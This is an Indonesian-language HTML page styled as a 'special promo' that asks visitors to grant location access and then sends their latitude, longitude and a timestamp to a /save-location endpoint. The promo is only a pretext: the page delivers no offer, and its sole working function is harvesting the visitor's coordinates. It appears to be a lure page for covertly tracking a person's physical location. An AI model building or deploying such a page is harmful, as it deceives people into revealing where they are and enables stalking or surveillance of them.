<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Spesial</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }

        h1 {
            color: #667eea;
            margin-bottom: 20px;
            font-size: 2em;
        }

        .promo-badge {
            background: #ff6b6b;
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            display: inline-block;
            margin-bottom: 20px;
            font-weight: bold;
        }

        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.1em;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            font-weight: bold;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.loading {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .icon {
            font-size: 3em;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">🎁</div>
    <h1>Selamat Datang!</h1>
    <div class="promo-badge">PROMO KHUSUS HARI INI</div>
    <p>Untuk memberikan layanan terbaik dan penawaran khusus di lokasi Anda, kami memerlukan akses lokasi Anda.</p>
    <p><strong>Klik tombol di bawah untuk melanjutkan</strong></p>

    <button id="getLocationBtn" class="btn">Izinkan Akses Lokasi</button>

    <div id="status" class="status"></div>
</div>

<script>
    const btn = document.getElementById('getLocationBtn');
    const status = document.getElementById('status');

    function showStatus(message, type) {
        status.textContent = message;
        status.className = 'status ' + type;
        status.style.display = 'block';
    }

    async function sendLocation(latitude, longitude) {
        try {
            const response = await fetch('/save-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    latitude,
                    longitude,
                    timestamp: new Date().toLocaleString('id-ID')
                })
            });

            if (response.ok) {
                showStatus('✓ Terima kasih! Lokasi berhasil disimpan.', 'success');
            } else {
                showStatus('× Gagal menyimpan lokasi. Silakan coba lagi.', 'error');
            }
        } catch (error) {
            showStatus('× Terjadi kesalahan. Silakan coba lagi.', 'error');
        }
    }

    btn.addEventListener('click', () => {
        if (!navigator.geolocation) {
            showStatus('× Browser Anda tidak mendukung geolocation.', 'error');
            return;
        }

        showStatus('Meminta akses lokasi...', 'loading');
        btn.disabled = true;

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                console.log('Lokasi ditemukan:', latitude, longitude);
                sendLocation(latitude, longitude);
                btn.disabled = false;
            },
            (error) => {
                let message = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        message = '× Akses lokasi ditolak. Silakan izinkan akses lokasi di browser Anda.';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        message = '× Informasi lokasi tidak tersedia.';
                        break;
                    case error.TIMEOUT:
                        message = '× Waktu permintaan lokasi habis.';
                        break;
                    default:
                        message = '× Terjadi kesalahan tidak dikenal.';
                }
                showStatus(message, 'error');
                btn.disabled = false;
            }
        );
    });
</script>
</body>
</html>
